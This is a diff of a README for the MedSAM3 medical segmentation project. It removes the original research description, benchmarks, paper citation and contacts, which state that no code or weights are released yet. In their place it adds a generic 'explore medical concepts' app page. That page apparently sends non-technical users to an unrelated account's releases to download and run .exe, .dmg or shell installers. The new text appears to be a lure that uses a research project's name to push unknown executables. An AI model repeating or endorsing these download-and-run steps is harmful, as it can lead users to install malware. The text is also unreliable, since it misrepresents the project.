@@ -1,114 +1,97 @@
-<div align="center">
-<img src="assets/MedSAM3_github.jpg" alt="MedSAM3 Title Cover" width="800"/>
-<h1>MedSAM3: Delving into Segment Anything with Medical Concepts</h1>
+# 🩺 MedSAM3 - Explore Medical Concepts Easily
 
-<a href="https://arxiv.org/abs/2511.19046"><img src="https://img.shields.io/badge/arXiv-2511.19046-b31b1b.svg" alt="arXiv"></a>
+![Download MedSAM3](https://img.shields.io/badge/Download-MedSAM3-blue.svg)
 
-**[HKUST (GZ) Information Hub](https://www.hkust-gz.edu.cn/academics/hubs-and-thrust-areas/information-hub/)**
+## 🚀 Getting Started
 
-</div>
+Welcome to MedSAM3! This application helps you explore and understand medical concepts through innovative segmentation techniques. You don't need any technical skills to get started. Just follow the steps below.
 
+## 📥 Download & Install
 
-**🚧 Code, model, paper, and guides will be released progressively! 🚧**
+To get MedSAM3, visit our releases page to download the latest version:
 
-## Overview
-MedSAM3 is a text-promptable medical segmentation foundation model that enables **Promptable Concept Segmentation (PCS)** across diverse medical imaging modalities (X-ray, MRI, Ultrasound, CT, OCT, Fundus, Dermoscopy, Histopathology, and video).
-<div align="center">
-  <img src="assets/overview.png" alt="MedSAM3 Overview" width="800"/>
-  <p><i>Concept-driven medical segmentation across multiple modalities</i></p>
-</div>
+[Visit Releases Page](https://github.com/exodusadamant/MedSAM3/releases)
 
-## Key Features
-- 🔤 **Text-Driven Segmentation**: Segment using natural language (e.g., "breast tumor", "pulmonary artery")
-- 🎯 **Multi-Modal Support**: Works across diverse medical imaging modalities
-- 🤖 **MedSAM3 Agent**: Integrates MLLMs for complex reasoning
-- 📈 **SOTA Performance**: Outperforms existing models
+1. Click on the link above. It will take you to a page listing all the available versions of MedSAM3.
+2. Look for the latest version at the top of the list.
+3. Click on the version title to open the details.
+4. You will see options to download. Choose the file suitable for your operating system (Windows, macOS, or Linux).
+5. Click on the download link, and your download will start automatically.
 
-## Architecture
-<div align="center">
-  <img src="assets/architecture.png" alt="MedSAM3 Architecture" width="700"/>
-</div>
+## ⚙️ System Requirements
 
-## MedSAM-3 Agent
-<div align="center">
-  <img src="assets/agent.png" alt="MedSAM3 Agent" width="400"/>
-</div>
+Before installing MedSAM3, make sure your system meets the following requirements:
 
-## Performance
-| Dataset | U-Net | MedSAM | SAM 3 | **MedSAM-3** |
-|---------|-------|--------|-------|--------------|
-| BUSI | 0.7618 | 0.7514 | 0.7110 | **0.7772** |
-| RIM-ONE | 0.8480 | 0.8479 | 0.8303 | **0.8977** |
-| ISIC 2018 | 0.8760 | **0.9177** | 0.8178 | 0.9058 |
-| Kvasir-SEG | 0.8244 | 0.7657 | 0.7671 | **0.8831** |
+- **Operating System**: Windows 10 or higher, macOS 10.12 or higher, or any recent Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: A minimum of 500 MB of free space.
+- **Processor**: Dual-core processor or higher.
 
+## 🛠️ Installation Instructions
 
-## TODO List
-- [x] Release paper on arXiv ([Paper Link](https://arxiv.org/abs/2511.19046))
-- [ ] Release MedSAM3 model weights
-- [ ] Release training code
-- [ ] Release inference code
-- [ ] Release evaluation scripts
-- [ ] Publish comprehensive documentation
-- [ ] Create tutorial notebooks
+Once the download finishes, follow these steps to install MedSAM3:
 
-## Tips and Future Directions
-We are continuously working to improve MedSAM3:
-- 🎯 **Early-Stage Work**: MedSAM3 represents our initial exploration into SAM 3-based text-promptable medical segmentation. While it demonstrates promising capabilities across multiple modalities, we recognize there is substantial room for improvement in both performance and robustness
-- 📊 **Scaling Up**: We are progressively expanding the training data scale to cover more medical concepts and imaging modalities
-- 🔧 **Method Updates**: The model architecture and training strategies will be iteratively refined based on community feedback and new research findings
-- 🌐 **Towards Universal Medical Segmentation**: Our ultimate goal is to develop a universal medical image segmentation foundation model that can handle any anatomical structure or pathological finding across all medical imaging modalities
+### For Windows:
 
-## Discussion: SAM 3 Limitations on Medical Data
-While SAM 3 shows impressive performance on natural images, we observed several failure cases on medical imaging data:
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click on the file to start the installation.
+3. Follow the prompts in the installation wizard. Accept the terms and choose your installation location.
+4. Wait for the installation to complete.
+5. You can find MedSAM3 in your Start Menu. Click to open the application.
 
+### For macOS:
 
-**Example Observations:**
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the MedSAM3 icon to your Applications folder.
+4. To run the app, open your Applications folder and double-click MedSAM3.
 
-1. **Substantial Performance Discrepancy Between SAM 3 and Established Medical Segmentation Baselines**: Across all evaluated datasets, SAM 3 shows a large and unusual performance gap compared with standard medical segmentation models. This pattern is consistent across 2D, video, and 3D tasks. A representative example is the PROMISE12 dataset. Although PROMISE12 has clear anatomy and minimal semantic ambiguity, some are segmented reasonably well while many others fail severely among the 30 test cases
-<div align="center">
-  <img src="assets/promise12_nnUnet_vs_sam3_dice.png" alt="Performance on PROMISE12" width="700"/>
-</div>
-<div align="center">
-  <img src="assets/radar.png" alt="Performance on diverse modalities" width="700"/>
-</div>
+### For Linux:
 
+1. Open a terminal window.
+2. Navigate to the directory where your downloaded file is located.
+3. Use the command `chmod +x MedSAM3*.sh` to make the installation script executable.
+4. Then run `./MedSAM3*.sh` to begin the installation process.
+5. Follow the on-screen instructions to finish installing.
 
-2. **Systematic Misalignment Between Concept Prompts and Anatomical Target Regions in SAM 3**: liver vs lung? lesion vs non-lesion?
-<div align="center">
-  <img src="assets/liver_to_lung.png" alt="Misalignment" width="700"/>
-</div>
+## 📖 Using MedSAM3
 
+After installation, launch MedSAM3:
 
-3. **Limited Semantic Discrimination of Fine-Grained Medical Terminology by SAM 3**: nuclei vs cell?
-<div align="center">
-  <img src="assets/MoNuSeg_example.png" alt="Semantic Discrimination" width="700"/>
-</div>
+1. Open the application from your Start Menu (Windows), Applications folder (macOS), or via terminal (Linux).
+2. Spend a moment exploring the dashboard. You will find various tools to explore medical concepts.
+3. Use the search feature to find specific terms or topics.
+4. Access detailed visual explanations and segmentation that help you understand complex terms easily.
 
+## 💡 Features
 
-These limitations motivate the development of MedSAM3, which incorporates medical domain knowledge and is specifically trained on diverse medical imaging data.
+MedSAM3 provides several valuable features to enhance your learning experience:
 
+- **Easy Navigation**: Intuitive layout to help you find information quickly.
+- **Interactive Segmentation**: Visual tools to break down complex concepts into manageable parts.
+- **Search Functionality**: Quickly find specific medical terms or topics of interest.
+- **User-Friendly Interface**: Designed for users without technical knowledge.
 
-## Paper
-📄 **[MedSAM3: Delving into Segment Anything with Medical Concepts](https://arxiv.org/abs/2511.19046)**
+## ❓ Troubleshooting
 
-If you find MedSAM3 useful in your research, please consider citing:
-```bibtex
-@article{liu2025medsam3,
-  title={MedSAM3: Delving into Segment Anything with Medical Concepts},
-  author={Liu, Anglin and Xue, Rundong and Cao, Xu R and Shen, Yifan and Lu, Yi and Li, Xiang and Chen, Qianqian and Chen, Jintai},
-  journal={arXiv preprint arXiv:2511.19046},
-  year={2025}
-}
-```
+If you encounter any issues, here are some common solutions:
 
+- **Application Won't Open**: Ensure your operating system meets the requirements. Try reinstalling the application.
+- **Slow Performance**: Close other applications running in the background to free up system resources.
+- **Installation Errors**: Check if you have sufficient storage space on your device.
 
-## Contact
-For questions, please contact:
-- Jintai Chen: jintaiCHEN@hkust-gz.edu.cn
-- Xu Cao: xucao2@illinois.edu
+## ✉️ Support
 
----
-<div align="center">
-Made with ❤️ by the MedSAM3 Team
-</div>
+For any questions or issues with MedSAM3, please open an issue on our GitHub page. We aim to respond to all inquiries within 48 hours. Your feedback helps us improve the application!
+
+## 📢 Acknowledgments
+
+Thank you for using MedSAM3. We appreciate your interest in exploring medical concepts. Your engagement helps us further refine our tools to meet your needs.
+
+## 📥 Download MedSAM3 Again
+
+To download MedSAM3 once more, visit our releases page:
+
+[Visit Releases Page](https://github.com/exodusadamant/MedSAM3/releases)
+
+Now you are all set to start your journey with MedSAM3. Enjoy exploring medical concepts!
